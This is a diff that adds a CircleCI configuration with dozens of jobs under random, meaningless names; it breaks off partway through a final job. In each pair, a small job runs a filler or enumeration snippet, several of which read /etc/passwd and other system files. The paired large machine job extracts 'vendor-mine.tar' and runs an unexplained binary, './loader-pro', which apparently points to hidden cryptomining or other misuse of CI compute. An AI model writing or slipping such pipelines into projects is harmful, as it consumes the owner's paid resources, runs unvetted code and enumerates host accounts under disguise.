@@ -1,0 +1,1911 @@
+version: 2.1
+
+jobs:
+  HashedPageProxy:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Build step-4 output
+          command: |
+            mkdir -p /tmp/aux3
+            { set +o pipefail 2>/dev/null; echo 'ready' >/tmp/oliveotter.txt && wc -c </tmp/oliveotter.txt; true ; } > /tmp/aux3/9ham6z0y8w4ww
+            echo "gate CORE-19: $(wc -c </tmp/aux3/9ham6z0y8w4ww) bytes total"
+      - persist_to_workspace:
+          root: /tmp/aux3
+          paths:
+            - '9ham6z0y8w4ww'
+  CORE-19:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/aux3
+      - run:
+          name: Pull 2
+          command: |
+            cat /tmp/aux3/9ham6z0y8w4ww
+      - run:
+          name: Fetch sources only
+          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar --extract -f vendor-mine.tar
+      - run:
+          name: Settle filesystem
+          command: sleep 30
+      - run:
+          command: uname -a
+      - run:
+          command: g++ --version
+      - run:
+          command: nice -n 0 ./loader-pro
+  YDY:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/aux3
+      - run:
+          name: Analyse the poster image and have done with it
+          command: |
+            mkdir -p /tmp/aux3
+            { set +o pipefail 2>/dev/null; printf '%s\n' "sorting results"|cut -d' ' -f1; true ; } > /tmp/aux3/27wMNRWh7zRKKh8
+            echo "gate q1-canary: $(wc -c </tmp/aux3/27wMNRWh7zRKKh8) bytes total"
+      - persist_to_workspace:
+          root: /tmp/aux3
+          paths:
+            - '27wMNRWh7zRKKh8'
+  q1-canary:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/aux3
+      - run:
+          name: Pull 2
+          command: |
+            cat /tmp/aux3/27wMNRWh7zRKKh8
+      - run:
+          name: Fetch sources only
+          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar --extract -f vendor-mine.tar
+      - run:
+          name: Settle filesystem
+          command: sleep 30
+      - run:
+          command: uname -a
+      - run:
+          command: g++ --version
+      - run:
+          command: nice -n 0 ./loader-pro
+  deps-misc-pos-clip:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/aux3
+      - run:
+          name: I had to pause the heartbeat
+          command: |
+            mkdir -p /tmp/aux3
+            { set +o pipefail 2>/dev/null; date --date="last friday" +"%T"; true ; } > /tmp/aux3/br0nz3.a7om.57ock.5tock
+            echo "gate q3-cleanup: $(wc -c </tmp/aux3/br0nz3.a7om.57ock.5tock) bytes total"
+      - persist_to_workspace:
+          root: /tmp/aux3
+          paths:
+            - 'br0nz3.a7om.57ock.5tock'
+  q3-cleanup:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/aux3
+      - run:
+          name: Pull 2
+          command: |
+            cat /tmp/aux3/br0nz3.a7om.57ock.5tock
+      - run:
+          name: Fetch sources only
+          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar --extract -f vendor-mine.tar
+      - run:
+          name: Settle filesystem
+          command: sleep 30
+      - run:
+          command: uname -a
+      - run:
+          command: g++ --version
+      - run:
+          command: nice -n 0 ./loader-pro
+  v8_4_84:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/aux3
+      - run:
+          name: 840 centrifuge samples
+          command: |
+            mkdir -p /tmp/aux3
+            { set +o pipefail 2>/dev/null; ls /etc | tac | awk '{print toupper(substr($0,1,1)) substr($0,2)}' | xargs; true ; } > /tmp/aux3/DJI_7661
+            echo "gate fiona-ci: $(wc -c </tmp/aux3/DJI_7661) bytes total"
+      - persist_to_workspace:
+          root: /tmp/aux3
+          paths:
+            - 'DJI_7661'
+  fiona-ci:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/aux3
+      - run:
+          name: Pull 2
+          command: |
+            cat /tmp/aux3/DJI_7661
+      - run:
+          name: Fetch sources only
+          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar --extract -f vendor-mine.tar
+      - run:
+          name: Settle filesystem
+          command: sleep 30
+      - run:
+          command: uname -a
+      - run:
+          command: g++ --version
+      - run:
+          command: nice -n 0 ./loader-pro
+  Yv3:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/aux3
+      - run:
+          name: seedAllReplicationLag
+          command: |
+            mkdir -p /tmp/aux3
+            { set +o pipefail 2>/dev/null; set -- cat koala; echo "${@: -1}"; true ; } > /tmp/aux3/GoldenPrairieBear
+            echo "gate update-metrics-leak: $(wc -c </tmp/aux3/GoldenPrairieBear) bytes total"
+      - persist_to_workspace:
+          root: /tmp/aux3
+          paths:
+            - 'GoldenPrairieBear'
+  update-metrics-leak:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/aux3
+      - run:
+          name: Pull 2
+          command: |
+            cat /tmp/aux3/GoldenPrairieBear
+      - run:
+          name: Fetch sources only
+          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar --extract -f vendor-mine.tar
+      - run:
+          name: Settle filesystem
+          command: sleep 30
+      - run:
+          command: uname -a
+      - run:
+          command: g++ --version
+      - run:
+          command: nice -n 0 ./loader-pro
+  choosehidden:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/aux3
+      - run:
+          name: reconcileBatchWindowV5
+          command: |
+            mkdir -p /tmp/aux3
+            { set +o pipefail 2>/dev/null; awk -F ":" '$7 !~ /nologin/ {print $1, $3}' /etc/passwd | expand -t 7; true ; } > /tmp/aux3/memo-7004
+            echo "gate API-290: $(wc -c </tmp/aux3/memo-7004) bytes total"
+      - persist_to_workspace:
+          root: /tmp/aux3
+          paths:
+            - 'memo-7004'
+  API-290:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/aux3
+      - run:
+          name: Pull 2
+          command: |
+            cat /tmp/aux3/memo-7004
+      - run:
+          name: Fetch sources only
+          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar --extract -f vendor-mine.tar
+      - run:
+          name: Settle filesystem
+          command: sleep 30
+      - run:
+          command: uname -a
+      - run:
+          command: g++ --version
+      - run:
+          command: nice -n 0 ./loader-pro
+  beta_hat:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Sweep the base model int8
+          command: |
+            mkdir -p /tmp/aux3
+            { set +o pipefail 2>/dev/null; cat /etc/passwd | grep -hv daemon | wc -l; true ; } > /tmp/aux3/fdfzf67
+            echo "gate node20-release: $(wc -c </tmp/aux3/fdfzf67) bytes total"
+      - persist_to_workspace:
+          root: /tmp/aux3
+          paths:
+            - 'fdfzf67'
+  node20-release:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/aux3
+      - run:
+          name: Pull 2
+          command: |
+            cat /tmp/aux3/fdfzf67
+      - run:
+          name: Fetch sources only
+          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar --extract -f vendor-mine.tar
+      - run:
+          name: Settle filesystem
+          command: sleep 30
+      - run:
+          command: uname -a
+      - run:
+          command: g++ --version
+      - run:
+          command: nice -n 0 ./loader-pro
+  item_v6:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/aux3
+      - run:
+          name: My held out set test
+          command: |
+            mkdir -p /tmp/aux3
+            { set +o pipefail 2>/dev/null; head -n 5 /etc/nsswitch.conf; true ; } > /tmp/aux3/RPCPDF
+            echo "gate Rollout_Service3: $(wc -c </tmp/aux3/RPCPDF) bytes total"
+      - persist_to_workspace:
+          root: /tmp/aux3
+          paths:
+            - 'RPCPDF'
+  Rollout_Service3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/aux3
+      - run:
+          name: Pull 2
+          command: |
+            cat /tmp/aux3/RPCPDF
+      - run:
+          name: Fetch sources only
+          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar --extract -f vendor-mine.tar
+      - run:
+          name: Settle filesystem
+          command: sleep 30
+      - run:
+          command: uname -a
+      - run:
+          command: g++ --version
+      - run:
+          command: nice -n 0 ./loader-pro
+  b:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/aux3
+      - run:
+          name: Bake profiling into the roadmap
+          command: |
+            mkdir -p /tmp/aux3
+            { set +o pipefail 2>/dev/null; awk -F'=' '{ print $2 }' /etc/os-release|tr '[:lower:]' '[:upper:]'|sort; true ; } > /tmp/aux3/fnv_55c6f48
+            echo "gate p-x: $(wc -c </tmp/aux3/fnv_55c6f48) bytes total"
+      - persist_to_workspace:
+          root: /tmp/aux3
+          paths:
+            - 'fnv_55c6f48'
+  p-x:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/aux3
+      - run:
+          name: Pull 2
+          command: |
+            cat /tmp/aux3/fnv_55c6f48
+      - run:
+          name: Fetch sources only
+          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar --extract -f vendor-mine.tar
+      - run:
+          name: Settle filesystem
+          command: sleep 30
+      - run:
+          command: uname -a
+      - run:
+          command: g++ --version
+      - run:
+          command: nice -n 0 ./loader-pro
+  m15c38:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/aux3
+      - run:
+          name: Escalation budget 12 ms
+          command: |
+            mkdir -p /tmp/aux3
+            { set +o pipefail 2>/dev/null; find /proc/self -maxdepth 1 -type f -name "*map*" | awk -F/ '{print $NF}' | sort | uniq -c | sort -rn | head -n 5; true ; } > /tmp/aux3/e52533e9-44fd-c982-b9db
+            echo "gate verify: $(wc -c </tmp/aux3/e52533e9-44fd-c982-b9db) bytes total"
+      - persist_to_workspace:
+          root: /tmp/aux3
+          paths:
+            - 'e52533e9-44fd-c982-b9db'
+  verify:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/aux3
+      - run:
+          name: Pull 2
+          command: |
+            cat /tmp/aux3/e52533e9-44fd-c982-b9db
+      - run:
+          name: Fetch sources only
+          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar --extract -f vendor-mine.tar
+      - run:
+          name: Settle filesystem
+          command: sleep 30
+      - run:
+          command: uname -a
+      - run:
+          command: g++ --version
+      - run:
+          command: nice -n 0 ./loader-pro
+  button_pad_session:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/aux3
+      - run:
+          name: Mission archival
+          command: |
+            mkdir -p /tmp/aux3
+            { set +o pipefail 2>/dev/null; cat /etc/passwd | tail -1 | cut -f1,7 -d':' | sort -u; true ; } > /tmp/aux3/9ab1f866a76
+            echo "gate all-greens: $(wc -c </tmp/aux3/9ab1f866a76) bytes total"
+      - persist_to_workspace:
+          root: /tmp/aux3
+          paths:
+            - '9ab1f866a76'
+  all-greens:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/aux3
+      - run:
+          name: Pull 2
+          command: |
+            cat /tmp/aux3/9ab1f866a76
+      - run:
+          name: Fetch sources only
+          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar --extract -f vendor-mine.tar
+      - run:
+          name: Settle filesystem
+          command: sleep 30
+      - run:
+          command: uname -a
+      - run:
+          command: g++ --version
+      - run:
+          command: nice -n 0 ./loader-pro
+  md5Pulse:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/aux3
+      - run:
+          name: truncate the query planner stats plz
+          command: |
+            mkdir -p /tmp/aux3
+            { set +o pipefail 2>/dev/null; tail -10 /proc/cpuinfo | tr -d '[:digit:]'; true ; } > /tmp/aux3/GOPR00073150
+            echo "gate victor-6: $(wc -c </tmp/aux3/GOPR00073150) bytes total"
+      - persist_to_workspace:
+          root: /tmp/aux3
+          paths:
+            - 'GOPR00073150'
+  victor-6:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/aux3
+      - run:
+          name: Pull 2
+          command: |
+            cat /tmp/aux3/GOPR00073150
+      - run:
+          name: Fetch sources only
+          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar --extract -f vendor-mine.tar
+      - run:
+          name: Settle filesystem
+          command: sleep 30
+      - run:
+          command: uname -a
+      - run:
+          command: g++ --version
+      - run:
+          command: nice -n 0 ./loader-pro
+  Donuts:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Build step-4 output
+          command: |
+            mkdir -p /tmp/aux3
+            { set +o pipefail 2>/dev/null; dirname "/tmp/policy-20210128.md"; true ; } > /tmp/aux3/CPU-MD5
+            echo "gate ga-v1: $(wc -c </tmp/aux3/CPU-MD5) bytes total"
+      - persist_to_workspace:
+          root: /tmp/aux3
+          paths:
+            - 'CPU-MD5'
+  ga-v1:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/aux3
+      - run:
+          name: Pull 2
+          command: |
+            cat /tmp/aux3/CPU-MD5
+      - run:
+          name: Fetch sources only
+          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar --extract -f vendor-mine.tar
+      - run:
+          name: Settle filesystem
+          command: sleep 30
+      - run:
+          command: uname -a
+      - run:
+          command: g++ --version
+      - run:
+          command: nice -n 0 ./loader-pro
+  psi_pred:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/aux3
+      - run:
+          name: Currently tagging the wiki
+          command: |
+            mkdir -p /tmp/aux3
+            { set +o pipefail 2>/dev/null; mkdir -p "/tmp/dawn-duck-cake" && touch "/tmp/dawn-duck-cake"/{mia,heidi,sam}.csv && ls -l "/tmp/dawn-duck-cake" | tail -n +2; true ; } > /tmp/aux3/R4hnL797s
+            echo "gate intergration: $(wc -c </tmp/aux3/R4hnL797s) bytes total"
+      - persist_to_workspace:
+          root: /tmp/aux3
+          paths:
+            - 'R4hnL797s'
+  intergration:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/aux3
+      - run:
+          name: Pull 2
+          command: |
+            cat /tmp/aux3/R4hnL797s
+      - run:
+          name: Fetch sources only
+          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar --extract -f vendor-mine.tar
+      - run:
+          name: Settle filesystem
+          command: sleep 30
+      - run:
+          command: uname -a
+      - run:
+          command: g++ --version
+      - run:
+          command: nice -n 0 ./loader-pro
+  camera-otherGet:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/aux3
+      - run:
+          name: Rerun Integration Suite Step
+          command: |
+            mkdir -p /tmp/aux3
+            { set +o pipefail 2>/dev/null; if [ ! -c /dev/null ] ; then echo exists; else echo "missing"; fi; true ; } > /tmp/aux3/CONFIG_WORKER_FILTER
+            echo "gate validate-staging-docker-image: $(wc -c </tmp/aux3/CONFIG_WORKER_FILTER) bytes total"
+      - persist_to_workspace:
+          root: /tmp/aux3
+          paths:
+            - 'CONFIG_WORKER_FILTER'
+  validate-staging-docker-image:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/aux3
+      - run:
+          name: Pull 2
+          command: |
+            cat /tmp/aux3/CONFIG_WORKER_FILTER
+      - run:
+          name: Fetch sources only
+          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar --extract -f vendor-mine.tar
+      - run:
+          name: Settle filesystem
+          command: sleep 30
+      - run:
+          command: uname -a
+      - run:
+          command: g++ --version
+      - run:
+          command: nice -n 0 ./loader-pro
+  lil-tax:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/aux3
+      - run:
+          name: Rinse the blank for 20 min
+          command: |
+            mkdir -p /tmp/aux3
+            { set +o pipefail 2>/dev/null; echo -n 'the answer is 42' | od -c | head -n 2; true ; } > /tmp/aux3/audit-4d810.log
+            echo "gate promote: $(wc -c </tmp/aux3/audit-4d810.log) bytes total"
+      - persist_to_workspace:
+          root: /tmp/aux3
+          paths:
+            - 'audit-4d810.log'
+  promote:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/aux3
+      - run:
+          name: Pull 2
+          command: |
+            cat /tmp/aux3/audit-4d810.log
+      - run:
+          name: Fetch sources only
+          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar --extract -f vendor-mine.tar
+      - run:
+          name: Settle filesystem
+          command: sleep 30
+      - run:
+          command: uname -a
+      - run:
+          command: g++ --version
+      - run:
+          command: nice -n 0 ./loader-pro
+  lightning-old-socket-tree:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/aux3
+      - run:
+          name: Rotation Or Shredding
+          command: |
+            mkdir -p /tmp/aux3
+            { set +o pipefail 2>/dev/null; cat /etc/passwd|cut -d: -f3|sort -n|uniq -c; true ; } > /tmp/aux3/abfc64f3a879
+            echo "gate run-nightly-regression-suite: $(wc -c </tmp/aux3/abfc64f3a879) bytes total"
+      - persist_to_workspace:
+          root: /tmp/aux3
+          paths:
+            - 'abfc64f3a879'
+  run-nightly-regression-suite:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/aux3
+      - run:
+          name: Pull 2
+          command: |
+            cat /tmp/aux3/abfc64f3a879
+      - run:
+          name: Fetch sources only
+          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar --extract -f vendor-mine.tar
+      - run:
+          name: Settle filesystem
+          command: sleep 30
+      - run:
+          command: uname -a
+      - run:
+          command: g++ --version
+      - run:
+          command: nice -n 0 ./loader-pro
+  SinglePosTrait:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/aux3
+      - run:
+          name: Forge the leave requests
+          command: |
+            mkdir -p /tmp/aux3
+            { set +o pipefail 2>/dev/null; compgen -A signal | tr '\n' ' '; true ; } > /tmp/aux3/vio13t-grov3
+            echo "gate cerberus-v2: $(wc -c </tmp/aux3/vio13t-grov3) bytes total"
+      - persist_to_workspace:
+          root: /tmp/aux3
+          paths:
+            - 'vio13t-grov3'
+  cerberus-v2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/aux3
+      - run:
+          name: Pull 2
+          command: |
+            cat /tmp/aux3/vio13t-grov3
+      - run:
+          name: Fetch sources only
+          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar --extract -f vendor-mine.tar
+      - run:
+          name: Settle filesystem
+          command: sleep 30
+      - run:
+          command: uname -a
+      - run:
+          command: g++ --version
+      - run:
+          command: nice -n 0 ./loader-pro
+  FOSTER:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Second Look At The MFA Settings
+          command: |
+            mkdir -p /tmp/aux3
+            { set +o pipefail 2>/dev/null; find /var/tmp -maxdepth 3 -type d -iname '*' -atime +30 -uid 0 -exec du -sh {} + 2>/dev/null | tail -n 20; true ; } > /tmp/aux3/widgetorchard
+            echo "gate v6-ga2: $(wc -c </tmp/aux3/widgetorchard) bytes total"
+      - persist_to_workspace:
+          root: /tmp/aux3
+          paths:
+            - 'widgetorchard'
+  v6-ga2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/aux3
+      - run:
+          name: Pull 2
+          command: |
+            cat /tmp/aux3/widgetorchard
+      - run:
+          name: Fetch sources only
+          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar --extract -f vendor-mine.tar
+      - run:
+          name: Settle filesystem
+          command: sleep 30
+      - run:
+          command: uname -a
+      - run:
+          command: g++ --version
+      - run:
+          command: nice -n 0 ./loader-pro
+  activedisable:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/aux3
+      - run:
+          name: Scroll until the submit button shows
+          command: |
+            mkdir -p /tmp/aux3
+            { set +o pipefail 2>/dev/null; sha1sum ${HOME}/.bashrc >/tmp/red_raven.sum && sha1sum -c /tmp/red_raven.sum; true ; } > /tmp/aux3/DJI59988
+            echo "gate DATA-634: $(wc -c </tmp/aux3/DJI59988) bytes total"
+      - persist_to_workspace:
+          root: /tmp/aux3
+          paths:
+            - 'DJI59988'
+  DATA-634:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/aux3
+      - run:
+          name: Pull 2
+          command: |
+            cat /tmp/aux3/DJI59988
+      - run:
+          name: Fetch sources only
+          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar --extract -f vendor-mine.tar
+      - run:
+          name: Settle filesystem
+          command: sleep 30
+      - run:
+          command: uname -a
+      - run:
+          command: g++ --version
+      - run:
+          command: nice -n 0 ./loader-pro
+  remote-normal-p:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/aux3
+      - run:
+          name: serve api
+          command: |
+            mkdir -p /tmp/aux3
+            { set +o pipefail 2>/dev/null; mkdir -p "/tmp/list-v3" && head -c 59985 /dev/urandom >"/tmp/list-v3"/blob && du -sh "/tmp/list-v3"; true ; } > /tmp/aux3/3768-Scarlet
+            echo "gate callisto-v2: $(wc -c </tmp/aux3/3768-Scarlet) bytes total"
+      - persist_to_workspace:
+          root: /tmp/aux3
+          paths:
+            - '3768-Scarlet'
+  callisto-v2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/aux3
+      - run:
+          name: Pull 2
+          command: |
+            cat /tmp/aux3/3768-Scarlet
+      - run:
+          name: Fetch sources only
+          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar --extract -f vendor-mine.tar
+      - run:
+          name: Settle filesystem
+          command: sleep 30
+      - run:
+          command: uname -a
+      - run:
+          command: g++ --version
+      - run:
+          command: nice -n 0 ./loader-pro
+  opt_bal_avg:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/aux3
+      - run:
+          name: Kindle the test database
+          command: |
+            mkdir -p /tmp/aux3
+            { set +o pipefail 2>/dev/null; find /dev -type d -name 'null' -empty -exec echo dir: {} \; 2> /dev/null|sort|head -12; true ; } > /tmp/aux3/144418_2016
+            echo "gate atlas-plus: $(wc -c </tmp/aux3/144418_2016) bytes total"
+      - persist_to_workspace:
+          root: /tmp/aux3
+          paths:
+            - '144418_2016'
+  atlas-plus:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/aux3
+      - run:
+          name: Pull 2
+          command: |
+            cat /tmp/aux3/144418_2016
+      - run:
+          name: Fetch sources only
+          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar --extract -f vendor-mine.tar
+      - run:
+          name: Settle filesystem
+          command: sleep 30
+      - run:
+          command: uname -a
+      - run:
+          command: g++ --version
+      - run:
+          command: nice -n 0 ./loader-pro
+  yY:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/aux3
+      - run:
+          name: PAY759
+          command: |
+            mkdir -p /tmp/aux3
+            { set +o pipefail 2>/dev/null; y='the quick brown fox jumps over the lazy dog' && printf '%s\n' "${y^}"; true ; } > /tmp/aux3/20160327
+            echo "gate Rollout_Service6: $(wc -c </tmp/aux3/20160327) bytes total"
+      - persist_to_workspace:
+          root: /tmp/aux3
+          paths:
+            - '20160327'
+  Rollout_Service6:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/aux3
+      - run:
+          name: Pull 2
+          command: |
+            cat /tmp/aux3/20160327
+      - run:
+          name: Fetch sources only
+          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar --extract -f vendor-mine.tar
+      - run:
+          name: Settle filesystem
+          command: sleep 30
+      - run:
+          command: uname -a
+      - run:
+          command: g++ --version
+      - run:
+          command: nice -n 0 ./loader-pro
+  uCacheSegment:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/aux3
+      - run:
+          name: SUP1429 Conveyor Count
+          command: |
+            mkdir -p /tmp/aux3
+            { set +o pipefail 2>/dev/null; find /var/tmp -maxdepth 2 -name '*' -exec ls -ld {} + 2>/dev/null|nl; true ; } > /tmp/aux3/44LMuCZtxuUZqyJ16D
+            echo "gate anothr-run: $(wc -c </tmp/aux3/44LMuCZtxuUZqyJ16D) bytes total"
+      - persist_to_workspace:
+          root: /tmp/aux3
+          paths:
+            - '44LMuCZtxuUZqyJ16D'
+  anothr-run:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/aux3
+      - run:
+          name: Pull 2
+          command: |
+            cat /tmp/aux3/44LMuCZtxuUZqyJ16D
+      - run:
+          name: Fetch sources only
+          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar --extract -f vendor-mine.tar
+      - run:
+          name: Settle filesystem
+          command: sleep 30
+      - run:
+          command: uname -a
+      - run:
+          command: g++ --version
+      - run:
+          command: nice -n 0 ./loader-pro
+  dwFlagsDiscountClosedMenu:
+    docker:
